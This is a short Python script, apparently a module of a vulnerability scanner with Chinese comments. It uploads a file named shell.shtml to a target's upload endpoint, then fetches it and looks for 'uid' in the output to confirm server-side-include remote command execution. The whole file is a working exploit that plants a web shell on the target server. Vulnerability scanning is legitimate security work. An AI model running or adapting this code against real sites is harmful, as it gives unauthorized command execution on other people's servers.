import requests
import re

class SSI:   
    def __init__(self):   #读取指定文件
        with open('../opt/前端传url.txt','r') as file:
            self.url = file.readline()
        self.heards={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
        }

    def upload_poc(self):
            files = {
                "file_upload": open('../opt/shell.shtml','rb'),
                "filename" : "shell.shtml",
                "Content-Type" : "text/html"
            }    #上传文件方式
            # print(files)
            response = requests.post(url=self.url,files=files,headers=self.heards)
            code = response.status_code
            # print(response.text)
            if code == 200:
                try:
                    agex = "\S+//\S+(?=/)"
                    poc = re.findall(agex,self.url)[0]+'/shell.shtml'
                    res = requests.get(poc)
                    if  'uid' in res.text :
                        a = "存在SSI远程命令执行漏洞"
                        print(a)
                        return a
                except:
                    pass
                
ssi = SSI()
def si():
    a = ssi.upload_poc()
    return a

